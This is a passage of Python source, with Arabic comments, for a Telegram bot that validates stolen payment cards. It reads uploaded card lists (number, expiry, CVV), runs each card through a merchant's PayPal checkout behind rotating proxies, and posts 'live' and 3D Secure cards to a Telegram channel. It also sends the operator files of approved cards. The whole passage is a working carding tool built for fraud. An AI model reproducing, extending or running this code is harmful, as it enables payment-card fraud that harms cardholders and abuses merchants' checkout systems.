            print(f"[+] تم تحديث البروكسيات (كل {PROXY_UPDATE_INTERVAL} بطاقة)")

        if status in ("APPROVED", "COMPLETED"):
            stats['approved'] += 1
            stats['last_response'] = 'SUCCESS'
            stats['approved_cards'].append(card)
            await update_dashboard(bot_app)
            await send_to_channel(bot_app, card, "APPROVED", "Approved")
            return card, "APPROVED", "Success"
        elif status == "PAYER_ACTION_REQUIRED":
            await asyncio.sleep(0.5)
            lookup_result = processor.step6_3ds_verification()
            status_3ds = lookup_result.get("threeDSStatus")
            liability = lookup_result.get("liability_shift", "NO")
            if status_3ds == "SUCCESS" and liability == "POSSIBLE":
                stats['approved'] += 1
                stats['last_response'] = 'SUCCESS'
                stats['approved_cards'].append(card)
                await update_dashboard(bot_app)
                await send_to_channel(bot_app, card, "APPROVED", "Approved")
                return card, "APPROVED", "Success"
            elif status_3ds == "CHALLENGE_REQUIRED":
                stats['secure_3d'] += 1
                stats['last_response'] = '3D CHALLENGE'
                stats['3ds_cards'].append(card)
                await update_dashboard(bot_app)
                await send_to_channel(bot_app, card, "3D_SECURE", "CHALLENGE_REQUIRED")
                return card, "3D_SECURE", "CHALLENGE_REQUIRED"
            else:
                stats['secure_3d'] += 1
                stats['last_response'] = f'3DS: {status_3ds}'
                stats['3ds_cards'].append(card)
                await update_dashboard(bot_app)
                await send_to_channel(bot_app, card, "3D_SECURE", status_3ds)
                return card, "3D_SECURE", status_3ds
        else:
            stats['rejected'] += 1
            stats['last_response'] = 'DECLINED'
            stats['declined_cards'].append(card)
            await update_dashboard(bot_app)
            return card, "DECLINED", status
    except Exception as e:
        stats['errors'] += 1
        stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        stats['declined_cards'].append(card)
        await update_dashboard(bot_app)
        return card, "ERROR", str(e)
    finally:
        stats['checking'] -= 1
        await update_dashboard(bot_app)

# ====== إرسال للقناة + Dashboard + الملفات + معالجة البطاقات + البوت ======
# (كل الدالات السابقة بدون تغيير، ما عدا إضافة التأخير في check_card)

# ====== إرسال للقناة ======
async def send_to_channel(bot_app, card, status_type, message):
    try:
        card_number = stats['approved'] + stats['secure_3d']
        if status_type == 'APPROVED':
            text = (
                "APPROVED CARD LIVE\n\n"
                f"`{card}`\n"
                f"Status: **Approved**\n"
                f"Card #{card_number}\n"
                f"Gateway: **CableMod + PayPal**\n"
                f"Mahmoud Saad"
            )
        elif status_type == "3D_SECURE":
            text = (
                "3D SECURE CARD\n\n"
                f"`{card}`\n"
                f"Status: **{message}**\n"
                f"Card #{card_number}\n"
                f"Gateway: **CableMod + PayPal**\n"
                f"Mahmoud Saad"
            )
        else:
            return
        await bot_app.bot.send_message(
            chat_id=CHANNEL_ID,
            text=text,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"[!] خطأ في إرسال رسالة للقناة: {e}")

# ====== Dashboard ======
def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    keyboard = [
        [InlineKeyboardButton(f"الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"{hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"Approved: {stats['approved']}", callback_data="approved"),
            InlineKeyboardButton(f"Declined: {stats['rejected']}", callback_data="rejected")
        ],
        [
            InlineKeyboardButton(f"3D Secure: {stats['secure_3d']}", callback_data="3ds"),
            InlineKeyboardButton(f"Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"Response: {stats['last_response']}", callback_data="response")
        ]
    ]
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("إيقاف الفحص", callback_data="stop_check")])
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"{stats['current_card']}", callback_data="current")])
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    if stats['dashboard_message_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=CHANNEL_ID,
                message_id=stats['dashboard_message_id'],
                text="**CABLEMOD + PAYPAL CHECKER - LIVE**",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass

# ====== إرسال ملفات نهائية ======
async def send_final_files(bot_app):
    try:
        if stats['approved_cards']:
            approved_text = "\n".join(stats['approved_cards'])
            with open("approved_cards.txt", "w") as f:
                f.write(approved_text)
            await bot_app.bot.send_document(
                chat_id=CHANNEL_ID,
                document=open("approved_cards.txt", "rb"),
                caption=f"**Approved Cards** ({len(stats['approved_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("approved_cards.txt")
        if stats['3ds_cards']:
            secure_text = "\n".join(stats['3ds_cards'])
            with open("3ds_cards.txt", "w") as f:
                f.write(secure_text)
            await bot_app.bot.send_document(
                chat_id=CHANNEL_ID,
                document=open("3ds_cards.txt", "rb"),
                caption=f"**3D Secure Cards** ({len(stats['3ds_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("3ds_cards.txt")
        if stats['declined_cards']:
            declined_text = "\n".join(stats['declined_cards'])
            with open("declined_cards.txt", "w") as f:
                f.write(declined_text)
            await bot_app.bot.send_document(
                chat_id=CHANNEL_ID,
                document=open("declined_cards.txt", "rb"),
                caption=f"**Declined Cards** ({len(stats['declined_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("declined_cards.txt")
    except Exception as e:
        print(f"[!] خطأ في إرسال الملفات: {e}")

# ====== معالجة البطاقات ======
async def process_cards(cards, bot_app):
    for i, card in enumerate(cards):
        if not stats['is_running']:
            break
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app)
        await check_card(card, bot_app)
        stats['cards_checked'] += 1
        if stats['cards_checked'] % 3 == 0:
            await update_dashboard(bot_app)
        await asyncio.sleep(2)
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed'
    await update_dashboard(bot_app)
    summary_text = (
        "**اكتمل الفحص!**\n\n"
        f"**الإحصائيات النهائية:**\n"
        f"الإجمالي: {stats['total']}\n"
        f"Approved: {stats['approved']}\n"
        f"Declined: {stats['rejected']}\n"
        f"3D Secure: {stats['secure_3d']}\n"
        f"Errors: {stats['errors']}\n\n"
        "**جاري إرسال الملفات...**"
    )
    await bot_app.bot.send_message(
        chat_id=CHANNEL_ID,
        text=summary_text,
        parse_mode='Markdown'
    )
    await send_final_files(bot_app)
    final_text = (
        "**تم إنهاء العملية بنجاح!**\n\n"
        "تم إرسال جميع الملفات\n"
        "شكراً لاستخدامك البوت!\n\n"
        "Gateway: CableMod + PayPal\n"
        "Mahmoud Saad"
    )
    await bot_app.bot.send_message(
        chat_id=CHANNEL_ID,
        text=final_text,
        parse_mode='Markdown'
    )

# ====== معالجات البوت ======
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("غير مصرح - هذا البوت خاص")
        return
    keyboard = [[InlineKeyboardButton("إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "**CABLEMOD + PAYPAL CARD CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n"
        "مثال: `5224231000447722|12|2030|007`\n\n"
        f"القناة: `{CHANNEL_ID}`\n"
        "Gateway: **CableMod + PayPal PPCP**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("غير مصرح")
        return
    if stats['is_running']:
        await update.message.reply_text("يوجد فحص جاري!")
        return

    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]

    stats.update({
        'total': len(cards),
        'checking': 0,
        'approved': 0,
        'rejected': 0,
        'secure_3d': 0,
        'errors': 0,
        'current_card': '',
        'error_details': {},
        'last_response': 'Starting...',
        'cards_checked': 0,
        'approved_cards': [],
        '3ds_cards': [],
        'declined_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })

    load_random_proxies(30)
    global PROXY_UPDATE_COUNTER
    PROXY_UPDATE_COUNTER = 0
    WooCommercePayPal.shared_update_counter = 0

    dashboard_msg = await context.application.bot.send_message(
        chat_id=CHANNEL_ID,
        text="**CABLEMOD + PAYPAL CHECKER - LIVE**",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id

    context.application.create_task(process_cards(cards, context.application))

    await update.message.reply_text(
        f"تم بدء الفحص!\n\n"
        f"إجمالي البطاقات: {len(cards)}\n"
        f"Gateway: CableMod + PayPal\n"
        f"تابع النتائج في القناة",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("غير مصرح - هذا البوت خاص")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("غير مصرح", show_alert=True)
        return
    await query.answer()
    if query.data == "stop_check":
        stats['is_running'] = False
        await update_dashboard(context.application)
        await query.message.reply_text("تم إيقاف الفحص!")

# ====== Main ======
def main():
    print("=" * 60)
    print("  CableMod + PayPal Telegram Bot")
    print("  تم حل مشكلة update_order_review_nonce")
    print("=" * 60)
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    print("البوت يعمل الآن...")
    print(f"القناة: {CHANNEL_ID}")
    print(f"الأدمن: {ADMIN_IDS}")
    print("=" * 60)
    app.run_polling()

if __name__ == "__main__":
    main()
